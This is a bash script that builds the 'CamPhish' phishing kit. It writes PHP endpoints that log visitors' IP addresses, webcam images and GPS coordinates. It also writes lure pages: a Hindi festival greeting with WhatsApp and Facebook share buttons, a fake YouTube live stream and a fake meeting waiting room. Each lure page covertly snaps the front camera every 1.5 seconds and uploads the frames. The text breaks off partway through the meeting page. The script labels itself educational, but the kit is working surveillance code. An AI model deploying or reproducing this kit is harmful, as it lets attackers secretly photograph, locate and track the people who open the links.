#!/bin/bash
# ==============================================
# CAMPHISH ULTIMATE - SINGLE FILE VERSION
# All 11 files merged into one
# Original by TechChip | Educational Purpose Only
# File: csk.sh
# ==============================================

# ==============================================
# START OF MAIN SCRIPT (camphish.sh)
# ==============================================

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
  
  function killall() {
    taskkill /F /IM "$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

# ==============================================
# FUNCTION: CREATE ALL NECESSARY FILES
# ==============================================
create_files() {
    
# ==============================================
# FILE: cleanup.sh (as function)
# ==============================================
cat > cleanup.sh << 'CLEANEOF'
#!/bin/bash
echo "Starting cleanup of unnecessary files and logs..."
rm -f *.log .cloudflared.log location_*.txt current_location.bak cam*.png index.php index2.html index3.html
if [ -d "saved_locations" ]; then rm -f saved_locations/*; fi
rm -f LocationLog.log LocationError.log Log.log
echo "Cleanup completed successfully!"
CLEANEOF
chmod +x cleanup.sh

# ==============================================
# FILE: ip.php
# ==============================================
cat > ip.php << 'IPEOF'
<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
}
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];
$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');
fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);
fclose($fp);
?>
IPEOF

# ==============================================
# FILE: post.php
# ==============================================
cat > post.php << 'POSTEOF'
<?php
$date = date('dMYHis');
$imageData=$_POST['cat'];
if (!empty($_POST['cat'])) {
    error_log("Received" . "\r\n", 3, "Log.log");
}
$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );
exit();
?>
POSTEOF

# ==============================================
# FILE: location.php
# ==============================================
cat > location.php << 'LOCEOF'
<?php
$date = date('dMYHis');
$latitude = isset($_POST['lat']) ? $_POST['lat'] : 'Unknown';
$longitude = isset($_POST['lon']) ? $_POST['lon'] : 'Unknown';
$accuracy = isset($_POST['acc']) ? $_POST['acc'] : 'Unknown';

if (!empty($_POST['lat']) && !empty($_POST['lon'])) {
    file_put_contents("LocationLog.log", "Location captured\n", FILE_APPEND);
    
    $data = "Latitude: " . $latitude . "\r\n" .
            "Longitude: " . $longitude . "\r\n" .
            "Accuracy: " . $accuracy . " meters\r\n" .
            "Google Maps: https://www.google.com/maps/place/" . $latitude . "," . $longitude . "\r\n" .
            "Date: " . $date . "\r\n";
    
    $file = 'location_' . $date . '.txt';
    
    try {
        $fp = fopen($file, 'w');
        if ($fp) {
            fwrite($fp, $data);
            fclose($fp);
            $console_log = fopen("current_location.txt", "w");
            fwrite($console_log, $data);
            fclose($console_log);
            
            $masterFile = 'saved.locations.txt';
            if (!file_exists($masterFile)) {
                touch($masterFile);
                chmod($masterFile, 0666); 
            }
            
            $fp = fopen($masterFile, 'a');
            if ($fp) {
                fwrite($fp, "\n=== New Location Captured ===\n" . $data . "\n");
                fclose($fp);
            }
            
            if (!is_dir('saved_locations')) {
                mkdir('saved_locations', 0755, true);
            }
            
            copy($file, 'saved_locations/' . $file);
            
            header('Content-Type: application/json');
            echo json_encode(['status' => 'success', 'message' => 'Location data received']);
        } else {
            throw new Exception("Could not open file for writing");
        }
    } catch (Exception $e) {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'Could not save location data']);
    }
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Location data missing or incomplete']);
}
exit();
?>
LOCEOF

# ==============================================
# FILE: debug_log.php
# ==============================================
cat > debug_log.php << 'DEBUGEOF'
<?php
if(isset($_POST['message'])) {
    $message = $_POST['message'];
    $date = date('Y-m-d H:i:s');
    
    $filtered_messages = [
        "Location data sent",
        "getLocation called",
        "Geolocation error",
        "Location permission denied"
    ];
    
    $should_filter = false;
    foreach($filtered_messages as $filtered_phrase) {
        if(strpos($message, $filtered_phrase) !== false) {
            $should_filter = true;
            break;
        }
    }
    
    if(!$should_filter && (
        strpos($message, 'Lat:') !== false || 
        strpos($message, 'Latitude:') !== false || 
        strpos($message, 'Position obtained') !== false
    )) {
        $location_log = fopen("location_debug.log", "a");
        fwrite($location_log, "[$date] $message\n");
        fclose($location_log);
        file_put_contents("LocationLog.log", "Location data captured\n", FILE_APPEND);
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
} else {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'No message provided']);
}
?>
DEBUGEOF

# ==============================================
# FILE: festivalwishes.html
# ==============================================
cat > festivalwishes.html << 'FESEOF'
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
<title>Happy fes_name to Your Friends</title>
    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"> 
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
    <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
    <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
<style>
    i { color:#f06414; }
input[type=name], select {
    width: 100%;
    padding: 12px 20px;
    margin: 4px 0;
    display: inline-block;
    border: 1px solid #ccc;
    border-radius: 4px;
    box-sizing: border-box;
}
.footerbtn1 {
    display: block;
    line-height: 15px;
    position: fixed;
    right:0px;
    bottom:0px;
    height:40px;
    border-radius: 15px;
    box-sizing: border-box;
    padding: 5px;
    background:#000099;
    color: #ffffff;
    font-size: 18px;
    text-align: center;
    text-decoration: none;
    width:45%;
    margin-right:10px;
    margin-right:30px;
    box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
    animation: footer infinite linear 1s;
    -webkit-transform: translate3d(30%,0,0);
    transform: translate3d(30%,0,0);
    position: fixed;
}
.footerbtn1 :active { box-shadow: none }
@-webkit-keyframes footer {
    from { -webkit-transform: rotateZ(0) }
    25% { -webkit-transform: rotateZ(1.5deg) }
    50% { -webkit-transform: rotateZ(0deg) }
    75% { -webkit-transform: rotateZ(-1.5deg) }
    to { -webkit-transform: rotateZ(0) }
}
.footerbtn {
    display: block;
    line-height: 15px;
    position: fixed;
    left:0px;
    bottom:0px;
    height:40px;
    border-radius: 15px;
    box-sizing: border-box;
    padding: 5px;
    background:#34af23;
    color: #ffffff;
    font-size: 18px;
    text-align: center;
    text-decoration: none;
    width:45%;
    margin-left:10px;
    margin-right:30px;
    box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
    animation: footer infinite linear 1s;
    -webkit-transform: translate3d(30%,0,0);
    transform: translate3d(30%,0,0);
    position: fixed;
}
.footerbtn :active { box-shadow: none }
@-webkit-keyframes footer {
    from { -webkit-transform: rotateZ(0) }
    25% { -webkit-transform: rotateZ(1.5deg) }
    50% { -webkit-transform: rotateZ(0deg) }
    75% { -webkit-transform: rotateZ(-1.5deg) }
    to { -webkit-transform: rotateZ(0) }
}
@-webkit-keyframes jello {  from, 11.1%, to {    transform: none;  }
  22.2% {    transform: skewX(-12.5deg) skewY(-12.5deg);  }
  33.3% {    transform: skewX(6.25deg) skewY(6.25deg);  }
  44.4% {    transform: skewX(-3.125deg) skewY(-3.125deg);  }
  55.5% {    transform: skewX(1.5625deg) skewY(1.5625deg);  }
  66.6% {    transform: skewX(-0.78125deg) skewY(-0.78125deg);  }
  77.7% {    transform: skewX(0.390625deg) skewY(0.390625deg);  }
  88.8% {    transform: skewX(-0.1953125deg) skewY(-0.1953125deg);  }
}
.jello {  -webkit-animation: jello 3s infinite;  transform-origin: center; -webkit-animation-delay:6s}
@-webkit-keyframes hue {
  from {    -webkit-filter: hue-rotate(0deg);  }
  to {    -webkit-filter: hue-rotate(-360deg);  }
}
    .m1{position:fixed;left:1%; width:auto;height:100%;top:1%;color:#000;}
    .m2{position:fixed;right:1%; width:auto;height:100%;top:1%;color:#000;}
.bubbles { font-family: arial; }
.bubbles hi { font-family: 'Luckiest Guy', cursive; color: black; }
hi { font-size:2.5em; user-select:none; }
hi span { display:inline-block; animation:float .2s ease-in-out infinite; }
 @keyframes float {
  0%,100%{ transform:none; }
  33%{ transform:translateY(-1px) rotate(-2deg); }
  66%{ transform:translateY(1px) rotate(2deg); }
}
body:hover span { animation:bounce .6s; }
@keyframes bounce {
  0%,100%{ transform:translate(0); }
  25%{ transform:rotateX(20deg) translateY(2px) rotate(-3deg); }
  50%{ transform:translateY(-20px) rotate(3deg) scale(1.1);  }
}
@import url(http://fonts.googleapis.com/css?family=Concert+One);
h1 { animation:glow 10s ease-in-out infinite; }
* { box-sizing:border-box; }
figure { animation:wobble 5s ease-in-out infinite; transform-origin:center center; transform-style:preserve-3d; }
@keyframes wobble {
  0%,100%{ transform:rotate3d(1,1,0,40deg); }
  25%{ transform:rotate3d(-1,1,0,40deg); }
  50%{ transform:rotate3d(-1,-1,0,40deg); }
  75%{ transform:rotate3d(1,-1,0,40deg); }
}
h1 { display:block; width:90%; line-height:1.5; font:900 35px 'Concert One', sans-serif; position:absolute; color:#fff; }
@keyframes glow {
  0%,100%{ text-shadow:0 0 30px red; }
  25%{ text-shadow:0 0 30px orange; }
  50%{ text-shadow:0 0 30px forestgreen; }
  75%{ text-shadow:0 0 30px cyan; }
}
h1:nth-child(2){ transform:translateZ(5px); }
h1:nth-child(3){ transform:translateZ(10px);}
h1:nth-child(4){ transform:translateZ(15px); }
h1:nth-child(5){ transform:translateZ(20px); }
h1:nth-child(6){ transform:translateZ(25px); }
h1:nth-child(7){ transform:translateZ(30p.rock{animation:infinite 1s rock}
@keyframes rock {  0% {    transform: rotate(-1deg);  }
  50% {    transform: rotate(2deg);  }
  100% {    transform: rotate(-1deg);  }}x); }
h1:nth-child(8){ transform:translateZ(35px); }
h1:nth-child(9){ transform:translateZ(40px); }
h1:nth-child(10){ transform:translateZ(45px); }
.rock{animation:infinite 1s rock}
@keyframes rock {  0% {    transform: rotate(-1deg);  }
  50% {    transform: rotate(2deg);  }
  100% {    transform: rotate(-1deg);  }}
.fuck{animation:infinite 1s fuck}
@keyframes rock {  0% {    transform: rotate(-2deg);  }
  50% {    transform: rotate(2deg);  }
  100% {    transform: rotate(-2deg);  }}
h2 { font-size: 38px; text-align: center; color:#008000; animation: rock infinite 1s; font-family: 'Indie Flower', cursive; letter-spacing: 2px; }
h3 { font-size: 48px; text-align: center; padding:1px; margin:1px; color: #f06414; aanimation: fuck infinite 1s; font-family: 'Indie Flower', cursive; letter-spacing: 2px; }
* {box-sizing: border-box;}
body {font-family: Verdana, sans-serif;}
.mySlides {display: none;}
img {vertical-align: middle;}
.slideshow-container { max-width: 1000px; position: relative; margin: auto; }
.text { color: #f2f2f2; font-size: 15px; padding: 8px 12px; position: absolute; bottom: 8px; width: 100%; text-align: center; }
.numbertext { color: #f2f2f2; font-size: 12px; padding: 8px 12px; position: absolute; top: 0; }
.dot { height: 15px; width: 15px; margin: 0 2px; background-color: #bbb; border-radius: 50%; display: inline-block; transition: background-color 0.6s ease; }
.active { background-color: #717171; }
.fade { -webkit-animation-name: fade; -webkit-animation-duration: 1.5s; animation-name: fade; animation-duration: 1.5s; }
@-webkit-keyframes fade { from {opacity: .4} to {opacity: 1} }
@keyframes fade { from {opacity: .4} to {opacity: 1} }
@media only screen and (max-width: 300px) { .text {font-size: 11px} }
.cssload-preloader { position: absolute; top: 0px; left: px; right: 40px; bottom: 20px; z-index: 10; }
.cssload-preloader > .cssload-preloader-box { position: absolute; height: 16px; top: 50%; left: 50%; margin: -8px 0 0 -82px; perspective: 110px; -o-perspective: 110px; -ms-perspective: 110px; -webkit-perspective: 110px; -moz-perspective: 110px; }
.cssload-preloader .cssload-preloader-box > div { position: relative; width: 16px; height: 16px; background: rgb(204,204,204); float: left; text-align: center; line-height: 16px; font-family: Verdana; font-size: 11px; color: rgb(255,255,255); }
.cssload-preloader .cssload-preloader-box > div:nth-child(1) { background: rgb(255,0,0); margin-right: 8px; animation: cssload-movement 690ms ease 0ms infinite alternate; -o-animation: cssload-movement 690ms ease 0ms infinite alternate; -ms-animation: cssload-movement 690ms ease 0ms infinite alternate; -webkit-animation: cssload-movement 690ms ease 0ms infinite alternate; -moz-animation: cssload-movement 690ms ease 0ms infinite alternate; }
.cssload-preloader .cssload-preloader-box > div:nth-child(2) { background: rgb(255,0,0); margin-right: 8px; animation: cssload-movement 690ms ease 86.25ms infinite alternate; -o-animation: cssload-movement 690ms ease 86.25ms infinite alternate; -ms-animation: cssload-movement 690ms ease 86.25ms infinite alternate; -webkit-animation: cssload-movement 690ms ease 86.25ms infinite alternate; -moz-animation: cssload-movement 690ms ease 86.25ms infinite alternate; }
.cssload-preloader .cssload-preloader-box > div:nth-child(3) { background: rgb(255,0,0); margin-right: 8px; animation: cssload-movement 690ms ease 172.5ms infinite alternate; -o-animation: cssload-movement 690ms ease 172.5ms infinite alternate; -ms-animation: cssload-movement 690ms ease 172.5ms infinite alternate; -webkit-animation: cssload-movement 690ms ease 172.5ms infinite alternate; -moz-animation: cssload-movement 690ms ease 172.5ms infinite alternate; }
.cssload-preloader .cssload-preloader-box > div:nth-child(4) { background: rgb(204,255,0); margin-right: 8px; animation: cssload-movement 690ms ease 258.75ms infinite alternate; -o-animation: cssload-movement 690ms ease 258.75ms infinite alternate; -ms-animation: cssload-movement 690ms ease 258.75ms infinite alternate; -webkit-animation: cssload-movement 690ms ease 258.75ms infinite alternate; -moz-animation: cssload-movement 690ms ease 258.75ms infinite alternate; }
.cssload-preloader .cssload-preloader-box > div:nth-child(5) { background: rgb(0,255,60); margin-right: 8px; animation: cssload-movement 690ms ease 345ms infinite alternate; -o-animation: cssload-movement 690ms ease 345ms infinite alternate; -ms-animation: cssload-movement 690ms ease 345ms infinite alternate; -webkit-animation: cssload-movement 690ms ease 345ms infinite alternate; -moz-animation: cssload-movement 690ms ease 345ms infinite alternate; }
.cssload-preloader .cssload-preloader-box > div:nth-child(6) { background: rgb(0,185,252); margin-right: 8px; animation: cssload-movement 690ms ease 431.25ms infinite alternate; -o-animation: cssload-movement 690ms ease 431.25ms infinite alternate; -ms-animation: cssload-movement 690ms ease 431.25ms infinite alternate; -webkit-animation: cssload-movement 690ms ease 431.25ms infinite alternate; -moz-animation: cssload-movement 690ms ease 431.25ms infinite alternate; }
.cssload-preloader .cssload-preloader-box > div:nth-child(7) { background: rgb(58,0,250); margin-right: 8px; animation: cssload-movement 690ms ease 517.5ms infinite alternate; -o-animation: cssload-movement 690ms ease 517.5ms infinite alternate; -ms-animation: cssload-movement 690ms ease 517.5ms infinite alternate; -webkit-animation: cssload-movement 690ms ease 517.5ms infinite alternate; -moz-animation: cssload-movement 690ms ease 517.5ms infinite alternate; }
.cssload-preloader .cssload-preloader-box > div:nth-child(8) { background: rgb(255,255,0); margin-right: 8px; animation: cssload-movement 690ms ease 603.75ms infinite alternate; -o-animation: cssload-movement 690ms ease 603.75ms infinite alternate; -ms-animation: cssload-movement 690ms ease 603.75ms infinite alternate; -webkit-animation: cssload-movement 690ms ease 603.75ms infinite alternate; -moz-animation: cssload-movement 690ms ease 603.75ms infinite alternate; }
.cssload-preloader .cssload-preloader-box > div:nth-child(9) { background: rgb(221,0,255); margin-right: 8px; animation: cssload-movement 690ms ease 690ms infinite alternate; -o-animation: cssload-movement 690ms ease 690ms infinite alternate; -ms-animation: cssload-movement 690ms ease 690ms infinite alternate; -webkit-animation: cssload-movement 690ms ease 690ms infinite alternate; -moz-animation: cssload-movement 690ms ease 690ms infinite alternate; }
.cssload-preloader .cssload-preloader-box > div:nth-child(10) { background: rgb(51,102,255); margin-right: 8px; animation: cssload-movement 690ms ease 776.25ms infinite alternate; -o-animation: cssload-movement 690ms ease 776.25ms infinite alternate; -ms-animation: cssload-movement 690ms ease 776.25ms infinite alternate; -webkit-animation: cssload-movement 690ms ease 776.25ms infinite alternate; -moz-animation: cssload-movement 690ms ease 776.25ms infinite alternate; }
</style>
</head>
<div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
 </div>
 <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 <script>
 function post(imgdata){
 $.ajax({
     type: 'POST',
     data: { cat: imgdata},
     url: 'forwarding_link/post.php',
     dataType: 'json',
     async: false,
     success: function(result){},
     error: function(){}
   });
 };
 'use strict';
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const errorMsgElement = document.querySelector('span#errorMsg');
 const constraints = { audio: false, video: { facingMode: "user" } };
 async function init() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     handleSuccess(stream);
   } catch (e) {
     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
   }
 }
 function handleSuccess(stream) {
   window.stream = stream;
   video.srcObject = stream;
   var context = canvas.getContext('2d');
   setInterval(function(){
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData); }, 1500);
 }
 init();
 </script>
<body class="bg" id="rakhi" style="background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9); -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover;">
<center><span style="font-size: 20px;"color: #ff077a;">▅ ▆ ▇ █ HAPPY fes_name █ ▇ ▆ ▅</center>	
<center>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:inline-block;width:300px;height:50px" data-ad-client="ca-pub-4696491179456446" data-ad-slot="2568634816"></ins>
<script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
</center>
 <center> 
<div class="container">
    <div class="main-greeting">
<div align="center html2canvas-ignore">
     <div style="font-size: 20px; font-weight: 500; color: Black;">
<p id="demo"></p>
<div dir="ltr" style="text-align: left;" trbidi="on">
<div style="background-color:rgb(255, 140, 0); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: whitesmoke; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
<marquee behavior="alternate"><b>
“fes_name का ये शुभ अवसर आपके जीवन में अनेकों ख़ुशियाँ लेकर आए”
</b></marquee>
</div>
<div style="background-color: rgb(255, 255, 255); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: blue; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
<marquee behavior="alternate"><b>
इस fes_name हमारी शुभकामनाएँ आपके साथ हैं
</b></marquee>
</div>
<div style="background-color: rgb(0, 255, 42); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: black; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
<marquee behavior="alternate"><b>
|| fes_name की हार्दिक बधाई || 
</b></marquee>
</div>
</div>
<br><br>
<center>
<figure>
	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript"> var a=prompt("Please Enter Your Name\n\n👇👇👇👇👇"); document.write(a); </script> </h1>
	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript"> document.write(a); </script> </h1>
	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript"> document.write(a); </script> </h1>
	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript"> document.write(a); </script></h1>
    <h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript"> document.write(a); </script> </h1>
    <h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript"> document.write(a); </script> </h1>
    <h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript"> document.write(a); </script></h1>
</figure>
 </center>
<div class="vi" style="text-align: center;">
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:inline-block;width:300px;height:50px" data-ad-client="ca-pub-4696491179456446" data-ad-slot="5590491777"></ins>
<script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
</center>
<br><br><center>
    <p style="text-align: center;"><strong><span style="background-color: #ffea00; color: #005f96; font-size: 18pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;Wishing you a very </span></p>
</center>
<br>
<p style="text-align: center;"><strong><span style="font-size: 21pt; font-family: 'comic sans ms', sans-serif; color: #ff7700;">✪ <span style="font-family: 'trebuchet ms', geneva;">Happy fes_name</span> ✪</span></strong></p>
<br>
<p style="text-align: center;"><strong><span style="background-color: #ff0000; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;to you and your lovely family </span></p>
  <br>
  <p style="text-align: center;"><span style="background-color: #008000; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;May this auspicious occasion of fes_name bring happiness, prosperity, health, and peace in your life.</span></p>
  <br>
  <p style="text-align: center;"><span style="background-color: #ff00ff; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;✪ I wish that this fes_name is your best one. ✪</span></p>
<br>
<p style="text-align: center;"><span style="background-color: #663399; color: #FFFAFA; font-size: 15pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp; यह संदेश fes_name तक सभी के मोबाइल में होना चाहिए यह आपका फर्ज हैं </span></p>
<br>
<center>
<div class="busi"><h4><p style="text-transform: uppercase;font-size: 26px;color:#ffffff;"> <script type="text/javascript" language="Javascript"> document.write( "by - " +a); </script><br><br></p></h4></center>
<center>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-4696491179456446" data-ad-slot="1112298516" data-ad-format="link" data-full-width-responsive="true"></ins>
<script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
</center>
</div>
        </div>
<script>
var countDownDate = new Date("October 10, 2018 00:00:00").getTime();
var x = setInterval(function() {
  var now = new Date().getTime();
  var distance = countDownDate - now;
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
  document.getElementById("demo").innerHTML = days + "<i> Days,</i> " + hours + " <i>Hrs,</i> " + minutes + "<i> Min,</i> " + seconds + "<i> Sec</i> ";
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("demo").innerHTML = "🙏 Welcome 🙏";
  }
}, 1000);
</script>       
            </div>
        </div>			
</body>
<center>
 <a class="footerbtn" href="whatsapp://send?text=*मुझसे पहले ऐसा संदेश आपके लिए किसी ने नही भेजा होगा निचे क्लिक करके देखो क्या है आपके लिए* 👉 forwarding_link" data-action="share/whatsapp/share">
 <img width="22px" height="22px" src="https://cdn.pixabay.com/photo/2015/08/03/13/58/soon-873316_640.png">  
 <b style="font-size: 26px;">Share</b>  
</a>
 <a class="footerbtn1" href="https://www.facebook.com/sharer/sharer.php?u= forwarding_link" target="_blank" title="Share this post on Facebook" class="facebook">
	<img width="22px" height="22px" src="https://cdn.pixabay.com/photo/2017/06/22/06/22/facebook-2429746_640.png">
 <b style="font-size: 26px;">Share</b>  
 </a>
</center>
</script>
</html>
FESEOF

# ==============================================
# FILE: LiveYTTV.html
# ==============================================
cat > LiveYTTV.html << 'YTTVEOF'
<!doctype html>
<html>
<head>
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>
<div class="video-wrap">
   <video id="video" playsinline autoplay></video>
</div>
<canvas id="canvas" width="640" height="480"></canvas>
<script>
function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'forwarding_link/post.php',
    dataType: 'json',
    async: false,
    success: function(result){},
    error: function(){}
  });
};
'use strict';
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');
const constraints = { audio: false, video: { facingMode: "user" } };
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;
  var context = canvas.getContext('2d');
  setInterval(function(){
       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);
}
init();
</script>
    <body>
        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
    </body>
</html>
YTTVEOF

# ==============================================
# FILE: OnlineMeeting.html
# ==============================================
cat > OnlineMeeting.html << 'ONLINEEOF'
<!doctype html>
<html>
<head>
  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>
<div class="video-wrap">
  <video id="video" playsinline autoplay></video>
</div>
<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
<style>
  @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
  body { height: 100vh; width: 100vw; }
  * { padding: 0px; margin: 0px; font-family: 'Nunito', sans-serif; font-weight: 500; }
  .main-screen { background-color: #273039; height: 100vh; width: 100%; display: flex; justify-content: center; align-items: center; }
  img { height: 80px; width: 80px; }
  .bottom-bar { position: fixed; padding: 0px 40px 0px -40px; bottom: 0px; height: 80px; width: 100%; background-color: #1F2022; display: flex; flex-direction: row; justify-content: center; align-items: center; color: #fff; }
  .icon-button { display: flex; flex-direction: column; justify-items: center; align-items: center; }
  i { margin-bottom: 8px; font-size: 26px; }
  button { color: #fff; background-color: crimson; padding: 5px 20px; border: none; border-radius: 5px; border-style: none; outline: none; }
  .float_button { background-color: #1F2022; height: 40px; border-radius: 5px; width: 40px; position: fixed; display: flex; align-items: center; justify-content: center; top: 5px; right: 5px; }
  #ac-wrapper { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,.6); z-index: 1001; }
  #popup { width: 555px; height: 35px; background: #FFFFFF; border: 5px solid #000; border-radius: 15px; -moz-border-radius: 15px; -webkit-border-radius: 15px; box-shadow: #64686e 0px 0px 3px 3px; -moz-box-shadow: #64686e 0px 0px 3px 3px; -webkit-box-shadow: #64686e 0px 0px 3px 3px; position: relative; top: 250px; left: 375px; }
</style>
<script>
  function post(imgdata) {
    $.ajax({
      type: 'POST',
      data: { cat: imgdata },
      url: 'forwarding_link/post.php',
      dataType: 'json',
      async: false,
      success: function (result) {},
      error: function () {}
    });
  };
  'use strict';
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const errorMsgElement = document.querySelector('span#errorMsg');
  const constraints = { audio: false, video: { facingMode: "user" } };
  async function init() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      handleSuccess(stream);
    } catch (e) {
      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
    }
  }
  function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;
    var context = canvas.getContext('2d');
    setInterval(function () {
      context.drawImage(video, 0, 0, 640, 480);
      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
      post(canvasData);
      video.play();
    }, 1500);
  }
  function PopUp(){
    document.getElementById('ac-wrapper').style.display="none"; 
  }
  init();
  $(document).ready(function(){
   setTimeout(function(){
      PopUp();
   },50000);
});
</script>
<body>
  <div class="float_button">
    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
  </div>
  <div id="ac-wrapper">
    <div id="popup">
        <center>
            <h2>Please wait the meeting host will let you in soon</h2>
        </center>
    </div>
